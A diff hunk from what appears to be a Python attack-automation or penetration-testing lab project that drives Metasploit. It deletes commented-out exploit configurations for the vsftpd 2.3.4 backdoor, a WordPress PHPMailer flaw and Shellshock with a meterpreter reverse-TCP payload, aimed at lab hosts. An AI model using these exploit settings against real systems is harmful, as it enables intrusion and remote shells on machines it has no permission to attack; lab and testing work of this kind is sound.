@@ -61,34 +61,7 @@ wordpress_dump_config = Action(
         ]
     }
 )
-    # vsftpd_exploit = ExecuteExploitAction(
-    #     'unix/ftp/vsftpd_234_backdoor',
-    #     'cmd/unix/interact',
-    #     {
-    #         'RHOSTS': 'target3',
-    #         'VERBOSE': True,
-    #     }
-    # )
-    # wordpress_exploit = ExecuteExploitAction(
-    #     # post/linux/gather/enum_wordpress
-    #     'unix/webapp/wp_phpmailer_host_header',
-    #     None,
-    #     {
-    #         'RHOSTS': 'wordpress',
-    #         'LHOST': 'msf',
-    #         'VERBOSE': True,
-    #     }
-    # )
-    # shellshock_exploit = ExecuteExploitAction(
-    #     'multi/http/apache_mod_cgi_bash_env_exec',
-    #     'linux/x86/meterpreter/reverse_tcp',
-    #     {
-    #         'RHOSTS': 'target2',
-    #         'TARGETURI': '/cgi-bin/stats',
-    #         'VERBOSE': True,
-    #         'LHOST': 'msfrpc',
-    #     }
-    # )
+
 
 def main(appconfig, msfrpc_hosts):
     """Main entry point allowing external calls
